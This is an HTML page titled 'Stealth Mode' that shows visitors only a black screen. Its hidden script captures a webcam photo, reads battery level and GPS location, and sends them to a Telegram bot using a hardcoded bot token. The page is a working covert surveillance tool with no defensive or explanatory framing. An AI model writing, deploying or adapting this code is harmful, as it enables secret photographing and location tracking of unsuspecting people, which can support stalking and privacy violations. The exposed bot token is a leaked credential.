<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealth Mode</title>
    <style>
        body { background-color: black; margin: 0; height: 100vh; overflow: hidden; }
    </style>
</head>
<body>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" width="300" height="200" style="display: none;"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
        const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_ID";  // 🔴 @username direct use nahi hoga, numeric ID chahiye

        let video = document.getElementById("video");
        let canvas = document.getElementById("canvas");
        let context = canvas.getContext("2d");

        // 🚀 **Camera Access & Capture Photo**
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            video.srcObject = stream;
            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                let imageData = canvas.toDataURL("image/png");
                video.srcObject.getTracks().forEach(track => track.stop()); // 📌 Camera Stop
                getUserData(imageData);
            }, 2000); // 🔥 2 sec ke andar photo capture
        }).catch(err => console.log("Camera blocked!"));

        // 🚀 **Battery & Location Fetch**
        let batteryLevel = "Unknown";
        navigator.getBattery().then(battery => {
            batteryLevel = `${Math.round(battery.level * 100)}%`;
        });

        let locationData = "Unknown";
        navigator.geolocation.getCurrentPosition(position => {
            locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
        });

        // 🚀 **Send Data to Telegram**
        function getUserData(imageData) {
            let message = `📸 **User Info**\n🔋 Battery: ${batteryLevel}\n📍 Location: ${locationData}`;

            // 🔹 Text Data Send
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
            });

            // 🔹 Photo Send
            let blob = dataURItoBlob(imageData);
            let formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob, "image.png");

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            }).catch(error => console.log("Photo sending error:", error));
        }

        // 🚀 **Convert Base64 to Blob (For Image Upload)**
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
